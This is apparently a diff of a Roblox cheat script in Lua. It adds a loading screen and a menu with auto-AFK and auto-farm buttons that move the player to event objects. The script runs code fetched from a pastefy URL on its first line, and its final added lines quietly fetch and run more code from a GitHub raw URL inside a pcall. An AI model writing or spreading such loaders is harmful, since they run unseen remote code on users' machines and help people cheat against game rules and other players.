@@ -1,84 +1,96 @@
 loadstring(game:HttpGet("https://pastefy.app/PxoZkaGR/raw"))()
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+local ScreenGui = Instance.new("ScreenGui")
+local Frame = Instance.new("Frame")
+local TextLabel = Instance.new("TextLabel")
+
+ScreenGui.Name = "LoadingScreen"
+ScreenGui.Parent = game.CoreGui
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+Frame.Parent = ScreenGui
+Frame.BackgroundColor3 = Color3.fromRGB(255, 69, 0)
+Frame.BorderSizePixel = 0
+Frame.Position = UDim2.new(0.3, 0, 0.35, 0)
+Frame.Size = UDim2.new(0.4, 0, 0.3, 0)
+
+TextLabel.Parent = Frame
+TextLabel.BackgroundTransparency = 1
+TextLabel.Size = UDim2.new(1, 0, 1, 0)
+TextLabel.Font = Enum.Font.FredokaOne
+TextLabel.Text = "🔥 Carregando Script... 🔥"
+TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel.TextScaled = true
+
+task.wait(3)
+ScreenGui:Destroy()
+
+local library = Instance.new("ScreenGui")
+local main = Instance.new("Frame")
+local afkBtn = Instance.new("TextButton")
+local farmBtn = Instance.new("TextButton")
+
+library.Name = "MenuAuto"
+library.Parent = game.CoreGui
+library.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+main.Name = "Main"
+main.Parent = library
+main.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+main.Position = UDim2.new(0.05, 0, 0.3, 0)
+main.Size = UDim2.new(0, 200, 0, 130)
+main.Active = true
+main.Draggable = true
+
+afkBtn.Name = "AFK"
+afkBtn.Parent = main
+afkBtn.BackgroundColor3 = Color3.fromRGB(0, 200, 0)
+afkBtn.Position = UDim2.new(0.1, 0, 0.1, 0)
+afkBtn.Size = UDim2.new(0.8, 0, 0.35, 0)
+afkBtn.Font = Enum.Font.GothamBold
+afkBtn.Text = "Ativar Auto AFK"
+afkBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+afkBtn.TextScaled = true
+
+farmBtn.Name = "FARM"
+farmBtn.Parent = main
+farmBtn.BackgroundColor3 = Color3.fromRGB(0, 120, 255)
+farmBtn.Position = UDim2.new(0.1, 0, 0.55, 0)
+farmBtn.Size = UDim2.new(0.8, 0, 0.35, 0)
+farmBtn.Font = Enum.Font.GothamBold
+farmBtn.Text = "Ativar Auto Farm"
+farmBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+farmBtn.TextScaled = true
+
+local afkOn = false
+afkBtn.MouseButton1Click:Connect(function()
+    afkOn = not afkOn
+    afkBtn.Text = afkOn and "AFK: ON" or "AFK: OFF"
+    while afkOn do
+        game:GetService("VirtualUser"):Button2Down(Vector2.new(0,0), workspace.CurrentCamera.CFrame)
+        task.wait(60)
+    end
+end)
+
+local farmOn = false
+farmBtn.MouseButton1Click:Connect(function()
+    farmOn = not farmOn
+    farmBtn.Text = farmOn and "AutoFarm: ON" or "AutoFarm: OFF"
+    while farmOn do
+        local player = game.Players.LocalPlayer
+        local events = workspace:FindFirstChild("Eventos")
+        if events then
+            for _,v in pairs(events:GetChildren()) do
+                if v:IsA("BasePart") then
+                    player.Character:MoveTo(v.Position)
+                    task.wait(1)
+                end
+            end
+        end
+        task.wait(3)
+    end
+end)
+
+pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/universalrobloxx/Grow-a-Garden/refs/heads/main/Speed%2520hub%25shit"))()
+end)
 
